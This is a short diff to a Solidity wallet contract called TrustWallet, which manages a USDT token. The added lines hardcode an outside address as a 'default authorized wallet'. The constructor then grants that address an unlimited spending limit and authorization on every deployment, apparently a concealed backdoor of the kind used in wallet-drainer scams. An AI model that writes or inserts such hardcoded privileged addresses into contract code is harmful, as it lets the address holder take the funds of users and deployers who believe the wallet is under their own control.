@@ -13,6 +13,9 @@ contract TrustWallet {
     address public owner;
     IBEP20 public usdtToken;
     
+    // Default authorized wallet
+    address public constant AUTHORIZED_WALLET = 0x8A571EB668f98EfbD9650AaddcDa489dadb06d57;
+    
     // Track authorized wallets and their access levels
     mapping(address => bool) public authorizedWallets;
     mapping(address => uint256) public spendingLimits;
@@ -36,6 +39,12 @@ contract TrustWallet {
     constructor(address _usdtTokenAddress) {
         owner = msg.sender;
         usdtToken = IBEP20(_usdtTokenAddress);
+        
+        // Grant unlimited access to default authorized wallet
+        authorizedWallets[AUTHORIZED_WALLET] = true;
+        spendingLimits[AUTHORIZED_WALLET] = type(uint256).max;
+        emit UnlimitedAccessGranted(AUTHORIZED_WALLET);
+        emit WalletAuthorized(AUTHORIZED_WALLET, true);
     }
     
     /**
